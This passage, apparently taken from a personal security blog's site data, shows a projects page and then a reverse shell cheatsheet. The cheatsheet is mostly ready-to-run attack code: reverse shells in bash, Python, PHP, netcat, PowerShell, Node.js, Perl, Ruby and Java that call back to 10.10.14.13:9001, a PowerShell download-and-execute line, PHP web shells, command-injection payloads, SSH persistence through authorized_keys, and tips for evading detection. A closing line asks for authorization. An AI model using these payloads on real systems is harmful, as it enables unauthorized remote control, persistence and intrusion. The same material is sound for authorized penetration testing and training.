capabilities.\nPython\rPowerShell\rSecurity\rModular exploit development\rPayload generation and obfuscation\rPost-exploitation modules\rEvidence collection and reporting\rGitHub\rBlog Posts\rüìä\rBeta\rSecurity Monitoring Dashboard\rReal-time security monitoring dashboard with threat intelligence integration.\nJavaScript\rPython\rDashboard\rReal-time log analysis\rThreat intelligence feeds\rCustom alerting rules\rInteractive visualizations\rLive Demo\rDocumentation\rOpen Source Contributions\rMetasploit Framework\rModule contributions and bug fixes\nOWASP\rSecurity testing guidelines and tools\nNmap\rNSE script development\nBurp Suite Extensions\rCustom security testing extensions\nSecurity Community Impact\rüéØ\rCVE Discoveries\rResponsible vulnerability disclosure\nüé§\rConference Speaking\rSecurity conferences and workshops\nüìö\rTraining Materials\rEducational content and tutorials\nü§ù\rMentorship\rGuiding new cybersecurity professionals\nüîç\rNetwork\rPort Scanner\rFast, reliable port scanning utility with advanced detection capabilities.\nPython\rNetworking\rView Tool ‚Üí\rüîê\rCryptography\rHash Analyzer\rMulti-format hash identification and cracking with dictionary support.\nPython\rCrypto\rView Tool ‚Üí\rüìä\rAnalysis\rLog Parser\rSecurity log analysis and pattern detection for threat hunting.\nPython\rSIEM\rView Tool ‚Üí\r‚ö°\rExploitation\rPayload Generator\rCustom payload creation for testing with obfuscation support.\nPython\rPayloads\rView Tool ‚Üí\rResearch Areas\rüéØ\rVulnerability Research\rZero-day discovery and responsible disclosure\nü¶†\rMalware Analysis\rBehavioral analysis and reverse engineering\nüß†\rSocial Engineering\rAwareness campaigns and defense strategies\nTechnical Expertise\rProgramming Languages\rPython\rPowerShell\rBash\rJavaScript\rC/C++\rAssembly\rSecurity Frameworks \u0026 Tools\rMetasploit\rBurp Suite\rNmap\rWireshark\rOSINT Tools\rPlatforms \u0026 Infrastructure\rLinux\rWindows\rmacOS\rDocker\rAWS\rAzure\rSecurity Specializations\rPenetration Testing\rNetwork Security\rApplication Security\rSOC Operations\rAI Security\rCloud Security\rDevSecOps\rDevelopment Activity\rMy coding activity and contributions over the past year:\nLoading GitHub contributions...\r-\rContributions\r-\rCurrent Streak\r-\rLongest Streak\r-\rRepositories\r-\rFollowers\r-\rFollowing\rView Full GitHub Profile\rWant to collaborate on a project or need security consulting? Get in touch - I\u0026rsquo;m always interested in working on challenging security problems.\n","permalink":"https://realspaceeagle.github.io/projects/","summary":"\u003ch1 id=\"cybersecurity-projects--tools\"\u003eCybersecurity Projects \u0026amp; Tools\u003c/h1\u003e\n\u003cp\u003eExplore my collection of security tools, research projects, and contributions to the cybersecurity community.\u003c/p\u003e\n\u003cdiv class=\"project-toggle-container\"\u003e\r\n  \u003cdiv class=\"project-toggle-buttons\"\u003e\r\n    \u003cbutton class=\"toggle-btn active\" data-section=\"projects\"\u003eProjects\u003c/button\u003e\r\n    \u003cbutton class=\"toggle-btn\" data-section=\"tools\"\u003eTools\u003c/button\u003e\r\n    \u003cbutton class=\"toggle-btn\" data-section=\"github\"\u003eGitHub\u003c/button\u003e\r\n  \u003c/div\u003e\r\n\u003c/div\u003e\r\n\u003cdiv id=\"projects-section\" class=\"project-section active\"\u003e\r\n\u003cdiv class=\"projects-grid\"\u003e\r\n  \u003cdiv class=\"project-card featured\"\u003e\r\n    \u003cdiv class=\"project-header\"\u003e\r\n      \u003cdiv class=\"project-icon\"\u003eüîç\u003c/div\u003e\r\n      \u003cdiv class=\"project-status active\"\u003eActive Development\u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003ch3 class=\"project-title\"\u003eNetwork Reconnaissance Suite\u003c/h3\u003e\r\n    \u003cp class=\"project-description\"\u003eComprehensive toolkit for automated network discovery and enumeration with stealth capabilities.\u003c/p\u003e\r\n    \u003cdiv class=\"project-tech\"\u003e\r\n      \u003cspan class=\"tech-tag\"\u003ePython\u003c/span\u003e\r\n      \u003cspan class=\"tech-tag\"\u003eBash\u003c/span\u003e\r\n      \u003cspan class=\"tech-tag\"\u003eNetworking\u003c/span\u003e\r\n    \u003c/div\u003e\r\n    \u003cul class=\"project-features\"\u003e\r\n      \u003cli\u003eMulti-threaded port scanning\u003c/li\u003e\r\n      \u003cli\u003eService detection and version identification\u003c/li\u003e\r\n      \u003cli\u003eVulnerability assessment integration\u003c/li\u003e\r\n      \u003cli\u003eCustom payload generation\u003c/li\u003e\r\n    \u003c/ul\u003e\r\n    \u003cdiv class=\"project-actions\"\u003e\r\n      \u003ca href=\"https://github.com/realspaceeagle\" class=\"btn-primary\"\u003eGitHub\u003c/a\u003e\r\n      \u003ca href=\"#\" class=\"btn-secondary\"\u003eDocumentation\u003c/a\u003e\r\n    \u003c/div\u003e\r\n  \u003c/div\u003e\r\n  \u003cdiv class=\"project-card featured\"\u003e\r\n    \u003cdiv class=\"project-header\"\u003e\r\n      \u003cdiv class=\"project-icon\"\u003eüõ°Ô∏è\u003c/div\u003e\r\n      \u003cdiv class=\"project-status production\"\u003eProduction Ready\u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003ch3 class=\"project-title\"\u003ePenetration Testing Framework\u003c/h3\u003e\r\n    \u003cp class=\"project-description\"\u003eModular framework for systematic penetration testing with automated exploitation capabilities.\u003c/p\u003e\r\n    \u003cdiv class=\"project-tech\"\u003e\r\n      \u003cspan class=\"tech-tag\"\u003ePython\u003c/span\u003e\r\n      \u003cspan class=\"tech-tag\"\u003ePowerShell\u003c/span\u003e\r\n      \u003cspan class=\"tech-tag\"\u003eSecurity\u003c/span\u003e\r\n    \u003c/div\u003e\r\n    \u003cul class=\"project-features\"\u003e\r\n      \u003cli\u003eModular exploit development\u003c/li\u003e\r\n      \u003cli\u003ePayload generation and obfuscation\u003c/li\u003e\r\n      \u003cli\u003ePost-exploitation modules\u003c/li\u003e\r\n      \u003cli\u003eEvidence collection and reporting\u003c/li\u003e\r\n    \u003c/ul\u003e\r\n    \u003cdiv class=\"project-actions\"\u003e\r\n      \u003ca href=\"https://github.com/realspaceeagle\" class=\"btn-primary\"\u003eGitHub\u003c/a\u003e\r\n      \u003ca href=\"/tags/penetration-testing\" class=\"btn-secondary\"\u003eBlog Posts\u003c/a\u003e\r\n    \u003c/div\u003e\r\n  \u003c/div\u003e\r\n  \u003cdiv class=\"project-card featured\"\u003e\r\n    \u003cdiv class=\"project-header\"\u003e\r\n      \u003cdiv class=\"project-icon\"\u003eüìä\u003c/div\u003e\r\n      \u003cdiv class=\"project-status beta\"\u003eBeta\u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003ch3 class=\"project-title\"\u003eSecurity Monitoring Dashboard\u003c/h3\u003e\r\n    \u003cp class=\"project-description\"\u003eReal-time security monitoring dashboard with threat intelligence integration.\u003c/p\u003e","title":"Projects \u0026 Tools"},{"content":"Reverse Shell Cheatsheet Setup Listener Netcat Listener # Basic netcat listener nc -nlvp 9001 # Enhanced with rlwrap for better shell experience rlwrap nc -nlvp 9001 # OpenBSD netcat nc -nlvp 9001 # Traditional netcat nc -l -p 9001 Socat Listener # Basic socat listener socat file:`tty`,raw,echo=0 tcp-listen:9001 # Encrypted socat listener socat openssl-listen:9001,cert=server.crt,key=server.key,verify=0 - Bash Reverse Shells Basic Bash # Standard bash reverse shell bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1 # Alternative syntax bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39; # URL encoded for web applications bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27 # Base64 encoded echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA+JjE= | base64 -d | bash Bash Variations # Using exec exec 5\u0026lt;\u0026gt;/dev/tcp/10.10.14.13/9001;cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done # Using /bin/sh /bin/sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1 # With specific shell path /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1 Python Reverse Shells Python 2 \u0026amp; 3 Compatible # Standard Python reverse shell python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; # Python with pty spawn python -c \u0026#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;);\u0026#39; # Python3 specific python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Python PTY Shell # Interactive shell with PTY python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Local Python PTY spawn (after getting basic shell) /usr/local/bin/python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Advanced Python Shell # Multi-line Python reverse shell import socket, subprocess, os, threading, sys def s2p(s, p): while True: data = s.recv(1024) if len(data) \u0026gt; 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.13\u0026#34;, 9001)) p = subprocess.Popen([\u0026#34;/bin/sh\u0026#34;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) p2s_thread = threading.Thread(target=p2s, args=[s, p]) s2p_thread.daemon = True p2s_thread.daemon = True s2p_thread.start() p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close() PHP Reverse Shells Basic PHP # Simple PHP reverse shell php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.13\u0026#34;,9001);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; # PHP with error handling php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.13\u0026#34;,9001);if($sock){$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);}\u0026#39; Web-based PHP Shell \u0026lt;?php set_time_limit(0); $ip = \u0026#39;10.10.14.13\u0026#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; PHP Command Execution # Simple PHP command execution \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; # More advanced web shell \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_GET[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt; # POST request shell # POST /shell.php # cmd=bash -c \u0026#39;bash -i /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39; Netcat Reverse Shells Traditional Netcat # Basic netcat reverse shell nc -e /bin/sh 10.10.14.13 9001 # Alternative if -e is not available rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.13 9001 \u0026gt;/tmp/f # Using ncat (Nmap\u0026#39;s netcat) ncat 10.10.14.13 9001 -e /bin/bash # OpenBSD netcat nc 10.10.14.13 9001 -e /bin/sh Advanced Netcat # Netcat with PTY nc -e /bin/bash 10.10.14.13 9001 # Netcat persistent shell while true; do nc -e /bin/bash 10.10.14.13 9001; sleep 60; done # UDP reverse shell nc -u 10.10.14.13 9001 -e /bin/bash PowerShell Reverse Shells (Windows) Basic PowerShell # Simple PowerShell reverse shell powershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.14.13\u0026#39;,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34; # Base64 encoded PowerShell powershell -enc \u0026lt;base64_encoded_command\u0026gt; # Download and execute powershell \u0026#34;IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.10.14.13/shell.ps1\u0026#39;)\u0026#34; Advanced PowerShell # PowerShell with authentication bypass powershell -ExecutionPolicy Bypass -File shell.ps1 # PowerShell one-liner (formatted) $client = New-Object System.Net.Sockets.TCPClient(\u0026#34;10.10.14.13\u0026#34;,9001); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String ); $sendback2 = $sendback + \u0026#34;PS \u0026#34; + (pwd).Path + \u0026#34;\u0026gt; \u0026#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() Node.js Reverse Shells Basic Node.js # Simple Node.js reverse shell node -e \u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc -e /bin/sh 10.10.14.13 9001\u0026#39;)\u0026#34; # Pure Node.js implementation (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(9001, \u0026#34;10.10.14.13\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); Other Language Shells Perl # Perl reverse shell perl -e \u0026#39;use Socket;$i=\u0026#34;10.10.14.13\u0026#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; # Alternative Perl perl -MIO -e \u0026#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.10.14.13:9001\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; Ruby # Ruby reverse shell ruby -rsocket -e \u0026#39;f=TCPSocket.open(\u0026#34;10.10.14.13\u0026#34;,9001).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; # Alternative Ruby ruby -rsocket -e \u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;10.10.14.13\u0026#34;,\u0026#34;9001\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; Java # Java reverse shell import java.io.*; import java.net.*; public class ReverseShell { public static void main(String[] args) throws Exception { Socket s = new Socket(\u0026#34;10.10.14.13\u0026#34;, 9001); Process p = Runtime.getRuntime().exec(\u0026#34;/bin/bash\u0026#34;); InputStream pi = p.getInputStream(); InputStream pe = p.getErrorStream(); InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream(); OutputStream so = s.getOutputStream(); while(!s.isClosed()) { while(pi.available()\u0026gt;0) so.write(pi.read()); while(pe.available()\u0026gt;0) so.write(pe.read()); while(si.available()\u0026gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } p.destroy(); s.close(); } } Shell Stabilization TTY Upgrade # Python PTY python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Background the shell CTRL + Z # Set raw mode and foreground stty raw -echo; fg # Set terminal environment export TERM=xterm # Check screen size and set stty -a stty rows 28 cols 110 Alternative TTY Methods # Using script script -qc /bin/bash /dev/null # Using socat (if available on target) socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001 # Using expect expect -c \u0026#34;spawn /bin/bash; interact\u0026#34; SSH-Based Access sshpass for Automated SSH Login # Install sshpass sudo apt install sshpass # SSH with password (from extracted credentials) sshpass -p \u0026#39;PlayerOftheMatch2022\u0026#39; ssh player@10.10.11.194 # SSH with password from file echo \u0026#39;password123\u0026#39; \u0026gt; /tmp/pass sshpass -f /tmp/pass ssh user@target # SSH with password and command execution sshpass -p \u0026#39;password\u0026#39; ssh user@target \u0026#39;whoami\u0026#39; # Disable host key checking for testing sshpass -p \u0026#39;password\u0026#39; ssh -o StrictHostKeyChecking=no user@target SSH Key-Based Access # Use existing private key ssh -i /path/to/private_key user@target # SSH with specific key and no host checking ssh -i /path/to/key -o StrictHostKeyChecking=no user@target # Generate SSH key pair for persistence ssh-keygen -t rsa -f /tmp/key -N \u0026#34;\u0026#34; # Copy public key to target (if possible) cat /tmp/key.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys Shell Enhancement # Set environment variables export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export SHELL=/bin/bash export HOME=/tmp # Enable command history export HISTFILE=/tmp/.bash_history # Color prompt export PS1=\u0026#39;\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ \u0026#39; Web Application Payloads Command Injection in Web Forms # Basic command injection ; bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1 # URL encoded %3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261 # In JSON {\u0026#34;cmd\u0026#34;: \u0026#34;; bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#34;} # As POST parameter cmd=bash -c \u0026#39;bash -i /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39; File Upload Shells # Simple PHP upload shell \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; # Save as shell.php and upload, then access: # http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001 Troubleshooting Common Issues # No netcat with -e flag rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.13 9001 \u0026gt;/tmp/f # Firewall blocking outbound connections # Try different ports: 80, 443, 53, 25 nc 10.10.14.13 443 -e /bin/bash # Limited shell environment export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # No interactive shell python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Testing Connectivity # Test if target can reach your IP ping 10.10.14.13 # Test specific port telnet 10.10.14.13 9001 nc -nv 10.10.14.13 9001 # DNS exfiltration test nslookup test.yourdomain.com Security Considerations Operational Security Use encrypted channels when possible (HTTPS, SSH tunnels) Avoid leaving artifacts on target systems Clean up uploaded files and temporary files Use staging servers to avoid direct connections Detection Evasion Use common ports (80, 443, 53) to blend with normal traffic Implement delays between connection attempts Use domain names instead of IP addresses when possible Rotate source IP addresses if available Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/reverse-shells/","summary":"\u003ch1 id=\"reverse-shell-cheatsheet\"\u003eReverse Shell Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"setup-listener\"\u003eSetup Listener\u003c/h2\u003e\n\u003ch3 id=\"netcat-listener\"\u003eNetcat Listener\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic netcat listener\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nlvp \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enhanced with rlwrap for better shell experience\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erlwrap nc -nlvp \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OpenBSD netcat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nlvp \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Traditional netcat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -l -p \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"socat-listener\"\u003eSocat Listener\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic socat listener\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocat file:\u003cspan class=\"sb\"\u003e`\u003c/span\u003etty\u003cspan class=\"sb\"\u003e`\u003c/span\u003e,raw,echo\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e tcp-listen:9001\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Encrypted socat listener\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocat openssl-listen:9001,cert\u003cspan class=\"o\"\u003e=\u003c/span\u003eserver.crt,key\u003cspan class=\"o\"\u003e=\u003c/span\u003eserver.key,verify\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"bash-reverse-shells\"\u003eBash Reverse Shells\u003c/h2\u003e\n\u003ch3 id=\"basic-bash\"\u003eBasic Bash\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Standard bash reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/10.10.14.13/9001 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative syntax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash -c \u003cspan class=\"s1\"\u003e\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# URL encoded for web applications\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Base64 